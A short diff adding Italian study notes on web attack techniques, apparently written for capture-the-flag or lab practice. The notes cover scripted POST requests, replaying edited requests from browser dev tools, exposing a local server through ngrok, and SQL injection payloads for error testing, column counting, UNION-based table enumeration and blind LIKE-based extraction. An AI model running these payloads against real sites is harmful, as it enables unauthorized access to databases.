@@ -1,0 +1,16 @@
+- Una richiesta base si può effettuare così:
+    data = {"username": "admin", "password": "admin"}
+    r = requests.post(url, data=data)
+
+- Posso fare una post da dev tools: apro la sezione rete, mando una normale post, copio come fetch la post, la incollo nella console, modifico il payload e la mando
+
+- Avviare un server con ngrok:
+    - python3 -m http.server 8080
+    - ngrok http 8080
+
+- SQL Injection:
+    - Per fare SQL-Injection, posso provare con: query = "1' -- ", se funziona allora è ok
+    - Per encodarlo, posso fare: queryEncoded = urllib.parse.quote(query, safe=''). Da web, posso usare dev tools con encodeURIComponent()
+    - Per vedere quanti elementi restituisce faccio "1' ORDER BY n -- ", l'ultimo n che funziona è il numero di elementi restituiti
+    - Union: "-1' UNION SELECT 1,...,n-1,table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1 OFFSET N -- " (vedi filtered)
+    - Blind: "-1' OR (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1 OFFSET N) LIKE 'a%' -- " (vedi filtered)
